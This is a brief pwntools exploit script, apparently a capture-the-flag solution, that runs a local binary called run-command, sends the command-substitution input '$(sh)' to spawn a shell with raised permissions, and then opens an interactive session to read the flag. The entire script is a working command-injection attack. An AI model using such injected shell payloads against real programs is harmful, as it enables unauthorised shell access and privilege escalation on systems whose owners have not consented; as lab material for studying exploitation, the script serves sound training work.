from pwn import *

p = process("./run-command")

# Requires sh binary to raise permissions and run a shell
p.sendline("$(sh)")

# Say cat flag, then exit.  Will print the flag to the screen
p.interactive()
